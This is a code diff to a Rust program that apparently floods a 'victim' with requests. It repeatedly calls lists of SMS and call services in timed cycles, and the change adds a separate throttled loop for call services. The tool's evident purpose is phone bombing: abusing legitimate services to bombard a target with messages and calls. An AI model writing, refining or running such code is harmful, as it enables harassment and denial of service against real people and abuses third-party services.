@@ -5,28 +5,9 @@ use reqwest::{Client, Method};
 use std::time::Duration;
 
 const SERVICES_DELAY: u64 = 15;
-const CALL_DELAY: u64 = 15;
+const CALL_SERVICES_DELAY: u64 = 30;
 
 pub async fn send(victim: Victim, cycles: u64) {
-    // let services = construct_services_list(victim.clone()).await;
-    // for service in services {
-    //     let t = tokio::spawn(async move {
-    //         send_single(service).await.expect("");
-    //     });
-    //     s.push(t);
-    // }
-
-    // let t = tokio::spawn(async move {
-    //     for _ in 0..cycles {
-    //         let services = construct_call_services_list(victim.clone()).await;
-    //         for service in services {
-    //             send_single(service).await.expect("");
-    //             tokio::time::sleep(Duration::from_secs(CALL_DELAY as u64)).await;
-    //         }
-    //     }
-    // });
-    // s.push(t);
-
     for i in 0..cycles {
         let services = construct_services_list(victim.clone()).await;
         let services_handles: Vec<_> = services
@@ -34,12 +15,28 @@ pub async fn send(victim: Victim, cycles: u64) {
             .map(|item| tokio::spawn(send_single(item)))
             .collect();
 
-        println!("Starting {} cycle", i + 1);
         for services_handle in services_handles {
             services_handle.await.unwrap();
         }
         if i < cycles - 1 {
             tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
+        }
+    }
+    for i in 0..cycles {
+        let call_services = construct_call_services_list(victim.clone()).await;
+        let call_services_handles: Vec<_> = call_services
+            .into_iter()
+            .map(|item| async move {
+                send_single(item).await;
+                tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
+            })
+            .collect();
+
+        for call_services_handle in call_services_handles {
+            call_services_handle.await;
+        }
+        if i < cycles - 1 {
+            tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
         }
     }
 }
